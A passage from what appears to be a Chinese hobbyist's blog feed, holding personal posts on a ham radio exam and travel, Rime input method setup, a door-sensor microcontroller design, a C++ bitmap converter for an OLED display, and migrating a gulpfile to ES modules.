href="https://github.com/JoshuaQYH/CV-code">https://github.com/JoshuaQYH/CV-code</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>图像处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机视觉</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>23年5月整理下近日的思路</title>
    <link href="/diary/whatRecentlyMay3/"/>
    <url>/diary/whatRecentlyMay3/</url>
    
    <content type="html"><![CDATA[<h1 id="梦想"><a href="#梦想" class="headerlink" title="梦想"></a>梦想</h1><p>4月了解到天津4.30有无线电AB证考试，高三就想着等成年了赶紧能设台拿呼号，结果拖到了21，更可气的是自己怎么就突然被迫年龄成了成年人，我虽然更能和身边的资源和解，但很难与自身和解，总想逃离现在的生活。</p><p>跑题了，30号我如期考了试，30道选择题答对25道就算过，我复习了一天半，这个我早在高三偷拿手机时的某几天晚上就全刷了个遍，但还是没能全对，现在已知我错了一道题，其他的没过5月好像还有机会，疫情的压力一过频率也多了。</p><p>为了留时间，提前去南京上海玩了6天，上海看了外滩、mihoyo、南京路步行街，南京有鸡鸣寺、玄武湖、钟山上的中山陵音乐台和什么塔，6天时间太紧了，多了没地住，主要还是费钱。来回车票住宿吃纯算自己消费的天数话是三天，一千三百多元，上海虹桥17点回天津的高铁好像经过阳澄湖，F座看外面很棒。</p><h1 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h1><p>作业一团乱码，想着快点做结果最后都把时间浪费了，计算机视觉是在这个n3350上跑得，c语言只装了个编译器。虽然上网性能不好，但要是能抓住续航长屏幕高清这一特点也能用的很舒服，搭配xfce虽然没有win一样方便的触控板手势，但罢了罢了，反正这破电脑触控板不好。<strong>Alt+滚轮可以启用放大镜功能</strong></p><p>还有一次我这个n3350的电脑没电了，之前在写小爱课程表的时候<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.bilibili.com/video/BV1hG4y1Q7D1">[1]</span></a></sup>js算是玩的比较上手了，遂用网页写了个能获得当前电量并大字显示在浏览器界面的应用，linux的笔记本电量就是个简单的写着从100以内数字的文件，之前写过crontab记录电量的脚本，现在我想应该只用把sed调通就好，网页css的关键是margin<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.runoob.com/css/css-margin.html">[2]</span></a></sup></p><h1 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h1><p>等拿到呼号就立刻打个牌子做个名片</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 其中5指每隔5秒刷新一次页面 --&gt;</span><br><span class="hljs-comment">&lt;!--&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5&quot;&gt;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;my-paragraph&quot;</span> &gt;</span> 90 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"></span><br><span class="css"><span class="hljs-selector-class">.my-paragraph</span> &#123;</span><br><span class="css">    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">8000%</span>;</span><br><span class="css">    <span class="hljs-attribute">line-height</span>:<span class="hljs-number">0%</span>;</span><br><span class="css">    <span class="hljs-attribute">text-align</span>: center;</span><br><span class="css"></span><br><span class="css">    <span class="hljs-attribute">margin-top</span>:<span class="hljs-number">450px</span>;</span><br><span class="css">&#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br>sed -e &#x27;s/(?&lt;=\&lt;p\&gt;).*(?=\&lt;/p\&gt;)/30/g&#x27; ./batFullScreen.html<br>sed -e &#x27;s/\&lt;p\&gt;.*\&lt;/p\&gt;/30/g&#x27; ./batFullScreen.html<br>sed -i &#x27;$a # This is a test&#x27; ./batFullScreen.html<br>sed -e &#x27;s/oo/kk/g&#x27; ./batFullScreen.html<br><br></code></pre></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.bilibili.com/video/BV1hG4y1Q7D1">https://www.bilibili.com/video/BV1hG4y1Q7D1</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.runoob.com/css/css-margin.html">https://www.runoob.com/css/css-margin.html</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>个人总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中州韵配置指南</title>
    <link href="/rimeConfiguation/"/>
    <url>/rimeConfiguation/</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>安装linux作为我EDC用机的系统后，在配置中州韵输入法的过程中耗费了许多时间，问题有：选择输入法框架(ibus/fcitx)、备选词显示、emoji输入、时间日期输入、设置双拼输入法等问题。本文将列举出我解决过程中有帮助的一些网站，同时整理一下自己的思路以便以后方便快速布置工作环境。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><ol><li>选择输入法框架<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://rime.im/download/">[1]</span></a></sup> 我使用了ibus，因为当时好像发现ibus是原生的，虽然安装过fcitx，但后来可能是因为适配原因放弃了这个方案。</li></ol><ol start="2"><li>这个网站<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/rime/home/wiki/UserGuide">[2]</span></a></sup> 中最有用的内容是介绍了导出设置和词典的功能，也可以从文章内的链接跳转至高级玩法。说实在的，官方的文档真难懂。</li></ol><ol start="3"><li>这个网站<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.cnblogs.com/hellxz/p/10198540.html">[3]</span></a></sup> 描述了设置文件的位置和作用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">/usr/share/rime-data：此目录为rime输入方案的数据源（差不多这意思）<br>~/.config/ibus/rime或~/.config/fcitx/rime：这里是配置文件最终生效的地方<br><br>default.yaml:这里最后的部署整合到一起的配置文件，不要在这里写配置<br>default.custom.yaml: 在这个文件中，我们可以创建自定义的全局配置，需要自己创建<br>installation.yaml:安装时自动创建的配置文件<br>输入方案名.schema.yaml：输入方案的默认配置文件<br>输入方案名.custom.yaml: 仅对指定输入方案的配置进行修改的配置文件<br>其余的均为输入方案生成的，可以不管<br>symbols.yaml:这个文件是符号相关的设置<br></code></pre></td></tr></table></figure></li></ol><ol start="4"><li>这个网站<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.aisoutu.com/a/1655310">[4]</span></a></sup>介绍了给输入法引入lua脚本生成当前时间日期的方法，但我使用时将translators直接放进小鹤双拼的schema.yaml时没有起作用</li></ol><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://rime.im/download/">https://rime.im/download/</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://github.com/rime/home/wiki/UserGuide">https://github.com/rime/home/wiki/UserGuide</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.cnblogs.com/hellxz/p/10198540.html">https://www.cnblogs.com/hellxz/p/10198540.html</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://www.aisoutu.com/a/1655310">https://www.aisoutu.com/a/1655310</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个简单的闭门传感系统建设规划</title>
    <link href="/securitySensor/"/>
    <url>/securitySensor/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>门开关传感器之前做过几版，实际上之前称不上传感器，之前只是个手动做的带开关和非门的报警器罢了。最接近现在的一版中采用的ne555有较大的静态功耗，现在使用单片机，希望它的低功耗能带来较长时间的续航。</p><h1 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h1><p>发送开/关门事件、ir汇报开关错误率、ir汇报电池状况、蜂鸣器摩斯电码发送超时报警、调试按键按下通过摩斯电码或ir信息包发送2~4信息</p><h1 id="前期分析"><a href="#前期分析" class="headerlink" title="前期分析"></a>前期分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>家里有两层门，一个是外门，一个是里面一个装饰用的门，有时存在忘记关外侧门的问题（以后装修记得只装一个门就好）。由此产生了对门开关状态检测的要求，对于一个DIY爱好者，当然喜欢自己做，经过几次迭代升级，我现在写出第三版计划的预期目标书。</p><h2 id="前版本分析"><a href="#前版本分析" class="headerlink" title="前版本分析"></a>前版本分析</h2><h3 id="第一版"><a href="#第一版" class="headerlink" title="第一版"></a>第一版</h3><p>第一版只采用一节CR2032钮扣电池，门传感器采用易拉罐皮作弹片，曲别针作触点的开关（闭门时断开）。<br>优点：</p><ul><li>断电时零功耗</li><li>小<br>缺点：</li><li>没有特殊功能如：蜂鸣器</li><li>开关外观不美观且大</li></ul><h3 id="第二版"><a href="#第二版" class="headerlink" title="第二版"></a>第二版</h3><p>第二版经过几次迭代，一开始使用ne555为灯增加闪烁功能，更易引起注意，后来添加一个ne555驱动一个无内部震荡电路的蜂鸣器。<br>优点：</p><ul><li>容易吸引注意</li><li>使用一个上拉的开关(闭门时拉低)，减小了开关复杂水平<br>缺点：</li><li>开门即响，不够智能</li><li>ne555即使通过复位脚停止震荡也有同样的功耗</li><li>为实现闭门断电使用了一个mos管，但奇怪的是有时有较大的发热、压降，导致有时2s锂电在mos管后对芯片供电电压不足4v，从而工作异常。（mos使用坏显卡拆机，ne555购自淘宝。</li></ul><h3 id="第三版（理论）"><a href="#第三版（理论）" class="headerlink" title="第三版（理论）"></a>第三版（理论）</h3><p>第三版有如下几个预期功能：</p><ol><li>休眠功耗达到uA级</li><li>有向中心设备传递时间的功能</li><li>成本尽量低</li><li>使用PCB<br><del>且现在经简易选型决定使用立创商城里最便宜且有货的NY8A051H</del>，向中心设备传递数据使用红外发射管，但这个芯片采用1k*14bit的EPROM，不能多次编程且容量较小，可能不够为蜂鸣器存储音乐。但我希望专门优化红外线传输功能，只要能传递能够计算出开关门事件发生时间就够了。播放音乐可以交给中央采集设备，最好再优化下蜂鸣器，当出现没有回传事件的故障时也能有开门超时报警功能。</li></ol><h3 id="真正的第三版（25年10月16日总结）"><a href="#真正的第三版（25年10月16日总结）" class="headerlink" title="真正的第三版（25年10月16日总结）"></a>真正的第三版（25年10月16日总结）</h3><p>使用STC8G1K08A采用SOP8封装，1M电阻被干簧管下拉唤醒（好像是下拉，得看中断原理），醒来后计时2分钟开始驱动蜂鸣器。待机功耗很低，电池从之前充不进去电的小音箱利旧，充电模块好像是TP4056。好像23年做好就放着了，很长时间没充电。</p><p>还利用了大学给崔老师写的STC8G1K08A加74HC595D做的串转并模块的一个串口修改参数的交互，做了一些debug的功能，比如修改频率、等待时间、直接开始响之类的。</p><p>焊接时用了买的贴片的三极管焊上细线驱动蜂鸣器，之前还有供电线皮融化和蜂鸣器虚搭导致不响的硬件BUG。最后成品还是很漂亮的，我自己可以翻翻23年7月4日拍的视频，并且同年6月9日修好了之前串转并的BUG（D型号有个缓存功能，某引脚不下拉不更新）</p><p>原工程在蛟龙16K的备份里了，很久没看，回头要把keil下下来维护一下。</p><h1 id="工程分析"><a href="#工程分析" class="headerlink" title="工程分析"></a>工程分析</h1><p>实际做起来才发现有许多实际问题，我想先考虑清楚一个框架再开始写会有许多帮助。以下内容虽然是普通的文字，但可能经过了综合考量和推敲，但考量的过程没有保留。请注意！</p><ul><li>延时函数：延时函数使用中断优先较低的定时器解决，中断前设置延时标志位即一个volatile变量，检测到接下来的内容可能中断就执行些不怕打断的工作。</li></ul><h1 id="程序框图"><a href="#程序框图" class="headerlink" title="程序框图"></a>程序框图</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">开门（下降沿中断从睡眠唤醒，然后关中断，用软delay函数间隔采样：总采样数右移一位(十进制除2操作)和开关开次数比较进行消抖）<br>?<br>计时器计时（每次溢出给一个变量+1）关门后发送开门时间。时间超时-蜂鸣器提示-超出过长时间-蜂鸣器报警，此时关门即刻停止报警，消抖开关后确认关门，ir发送报文，最后发出简短提醒提示已关好或回到初始状态<br>任意时刻按下报文按键回报电量，关门后按键蜂鸣器发送数据包[数据包编号；开门时间；电量；报警状态]<br>：消抖失败，给网关发送开关故障报告<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>将图片转换到单片机上显示</title>
    <link href="/bmp2hex/"/>
    <url>/bmp2hex/</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>我通过在网上寻找工具及借鉴开源社区留言，探索出一种位图转二进制写入单片机的工作流程<br><img src="https://pic1.imgdb.cn/item/6954f04a8801094e3ab5019a.jpg" alt="有图有真相"></p><h1 id="流水帐式流程"><a href="#流水帐式流程" class="headerlink" title="流水帐式流程"></a>流水帐式流程</h1><ol><li>使用开源的GIMP处理图像为128x53的16bit二值化BMP文件</li><li>我找到一个开源工具，使用Monochrome预设导出图片，其内置大小端设置，但其将2byte作为最小粒度<blockquote><p><a href="https://github.com/riuson/lcd-image-converter">https://github.com/riuson/lcd-image-converter</a></p></blockquote></li><li>显示不正常，可感受到以一小块为单位左右割裂颠倒。网上找到一个帖子描述了这种现象的成因。<blockquote><p><a href="https://forum.arduino.cc/t/solved-problem-drawing-bmp-in-oled-i2c-ssd1306-with-esp8266/417698/11">https://forum.arduino.cc/t/solved-problem-drawing-bmp-in-oled-i2c-ssd1306-with-esp8266/417698/11</a></p></blockquote></li><li>文章锁定前最后一个大佬给出了一个c程序，但我用不了</li><li>我上手修改，重拾大一下c++，用到了当时不懂现在还不懂的动态内存和指针<h1 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//Origin:https://forum.arduino.cc/t/solved-problem-drawing-bmp-in-oled-i2c-ssd1306-with-esp8266/417698/11</span><br><span class="hljs-comment">//Some changes were made on the basis of the original version, which did not work properly on my VS2010</span><br><span class="hljs-comment">//MIT Lisences By:Zhaosn</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> myBitmap[] = &#123; <span class="hljs-comment">//this is the array char</span><br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">inverter</span><span class="hljs-params">(<span class="hljs-keyword">char</span> val)</span></span>&#123; <span class="hljs-comment">// this function invert the value</span><br><span class="hljs-keyword">char</span> ret;<br><span class="hljs-keyword">char</span> a = (val &amp; <span class="hljs-number">0x01</span>)&lt;&lt;<span class="hljs-number">7</span>;<br><span class="hljs-keyword">char</span> b = (val &amp; <span class="hljs-number">0x02</span>)&lt;&lt;<span class="hljs-number">5</span>;<br><span class="hljs-keyword">char</span> c = (val &amp; <span class="hljs-number">0x04</span>)&lt;&lt;<span class="hljs-number">3</span>;<br><span class="hljs-keyword">char</span> d = (val &amp; <span class="hljs-number">0x08</span>)&lt;&lt;<span class="hljs-number">1</span>;<br><span class="hljs-keyword">char</span> e = (val &amp; <span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">1</span>;<br><span class="hljs-keyword">char</span> f = (val &amp; <span class="hljs-number">0x20</span>)&gt;&gt;<span class="hljs-number">3</span>;<br><span class="hljs-keyword">char</span> g = (val &amp; <span class="hljs-number">0x40</span>)&gt;&gt;<span class="hljs-number">5</span>;<br><span class="hljs-keyword">char</span> h = (val &amp; <span class="hljs-number">0x80</span>)&gt;&gt;<span class="hljs-number">7</span>;<br><br>ret = a|b|c|d|e|f|g|h;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br><br><span class="hljs-keyword">int</span> size = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(myBitmap);<span class="hljs-comment">// myBitmap is the name for our array char</span><br><span class="hljs-keyword">char</span> *values = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>values = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span> [size];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; size; i++)&#123;<br>values[i] = <span class="hljs-built_in">inverter</span>(myBitmap[i]); <span class="hljs-comment">// here we revert each value;*</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%02x&quot;</span>,(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)values[i]); <span class="hljs-comment">//need &quot;(unsigned char)&quot; or it will display as &quot;0xffffffxx&quot;. It is &quot;2&#x27;s complement&quot;.</span><br><span class="hljs-keyword">if</span>(count == <span class="hljs-number">15</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;,\n&quot;</span>);<br>count = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i == size<span class="hljs-number">-1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;, &quot;</span>);<br>count++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">delete</span> values;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>Cpp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ES6下对commonjs语法的更新</title>
    <link href="/blog/es6-js-gulp/"/>
    <url>/blog/es6-js-gulp/</url>
    
    <content type="html"><![CDATA[<p>从《<a href="hexo-minifier.md">hexo-minifier gulp 压缩博客</a> 》到对 ES6 的研究</p><span id="more"></span><p>ES6 与 commonjs 与 gulp<br>对之前的“压缩博客”中提到的 gulpfile 改造的过程中加入了 imagemin 但从7.0.1后其不再支持commonjs语法。<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/imagemin/imagemin/issues/380">[1]</span></a></sup><br>但我就想用最新版本，开始改造后找各种资料从零开始了解js语法规范。<br>经过各种尝试终于有一次返回了详细的解决方法而不是错误代码让我自己去找。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">zhaosn@collei:~/Documents/Blog$ gulp<br>file:///home/zhaosn/Documents/Blog/gulpfile.mjs:4<br>import &#123;uglify&#125; from &#x27;gulp-uglify-es&#x27;;//https://gitlab.com/itayronen/gulp-uglify-es<br>        ^^^^^^<br>SyntaxError: Named export &#x27;uglify&#x27; not found. The requested module &#x27;gulp-uglify-es&#x27; is a CommonJS module, which may not support all module.exports as named exports.<br>CommonJS modules can always be imported via the default export, for example using:<br><br>import pkg from &#x27;gulp-uglify-es&#x27;;<br>const &#123;uglify&#125; = pkg;<br><br>zhaosn@collei:~/Documents/Blog$ gulp<br>file:///home/zhaosn/Documents/Blog/gulpfile.mjs:4<br>import &#123;plugin as uglify&#125; from &#x27;gulp-uglify-es&#x27;;//https://gitlab.com/itayronen/gulp-uglify-es<br>        ^^^^^^<br>SyntaxError: Named export &#x27;plugin&#x27; not found. The requested module &#x27;gulp-uglify-es&#x27; is a CommonJS module, which may not support all module.exports as named exports.<br>CommonJS modules can always be imported via the default export, for example using:<br><br>import pkg from &#x27;gulp-uglify-es&#x27;;<br>const &#123;plugin: uglify&#125; = pkg;<br></code></pre></td></tr></table></figure><p>原代码片段：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> imagemin, &#123;gifsicle, mozjpeg, optipng, svgo&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-imagemin&#x27;</span>;<br><span class="hljs-keyword">import</span> gulp <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp&#x27;</span>;<br><span class="hljs-keyword">import</span> cleancss <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-clean-css&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123;uglify&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-uglify-es&#x27;</span>;<span class="hljs-comment">//https://gitlab.com/itayronen/gulp-uglify-es</span><br><span class="hljs-keyword">import</span> htmlmin <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-html-minifier-terser&#x27;</span>;<br></code></pre></td></tr></table></figure><p>上个博文里用的 require 全改成了 import ，下面的 gulp.task 都没改。uglify 之前是 require().default 的形式，事出反常，上网找后参考<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://es6.ruanyifeng.com/#docs/module">[2]</span></a></sup>添加了花括号。<br>然后边改边试，改到不报错大概就成功了呗，于是我开始乱试。<br>最后我使用了以下代码的「片段」成功了，我注释掉了uglify因为我不知该怎样适配其后的”.default”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> imagemin, &#123;gifsicle, mozjpeg, optipng, svgo&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-imagemin&#x27;</span>;<br><span class="hljs-keyword">import</span> gulp <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp&#x27;</span>;<br><span class="hljs-keyword">import</span> cleancss <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-clean-css&#x27;</span>;<br><span class="hljs-comment">//let uglify = require(&#x27;gulp-uglify-es&#x27;).default;//https://gitlab.com/itayronen/gulp-uglify-es</span><br><span class="hljs-keyword">import</span> htmlmin <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;gulp-html-minifier-terser&#x27;</span>;<br><span class="hljs-comment">// 压缩public目录下的图片</span><br><span class="hljs-comment">//https://github.com/sindresorhus/gulp-imagemin</span><br>gulp.task(<span class="hljs-string">&#x27;minify-images&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> gulp.src([<span class="hljs-string">&#x27;./public/img/*.jpg&#x27;</span>,<span class="hljs-string">&#x27;./public/img/*.png&#x27;</span>])<br>        .pipe(imagemin([<br>            mozjpeg(&#123;<span class="hljs-attr">quality</span>: <span class="hljs-number">75</span>, <span class="hljs-attr">progressive</span>: <span class="hljs-literal">true</span>&#125;),<br>    optipng(&#123;<span class="hljs-attr">optimizationLevel</span>: <span class="hljs-number">5</span>&#125;)<br>        ]))<br>        .pipe(gulp.dest(<span class="hljs-string">&#x27;./public&#x27;</span>))<br>&#125;);<br></code></pre></td></tr></table></figure><p>执行结果发现图片压缩需要大量时间但也没多少成果，所以这份研究没那么有意义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">zhaosn@collei:~/Documents/Blog$ gulp <br>[05:51:02] Using gulpfile ~/Documents/Blog/gulpfile.mjs<br>[05:51:02] Starting <span class="hljs-string">&#x27;default&#x27;</span>...<br>[05:51:02] Starting <span class="hljs-string">&#x27;minify-css&#x27;</span>...<br>[05:51:02] Starting <span class="hljs-string">&#x27;minify-html&#x27;</span>...<br>[05:51:02] Starting <span class="hljs-string">&#x27;minify-images&#x27;</span>...<br>[05:51:06] Finished <span class="hljs-string">&#x27;minify-css&#x27;</span> after 3.92 s<br>[05:51:38] Finished <span class="hljs-string">&#x27;minify-html&#x27;</span> after 37 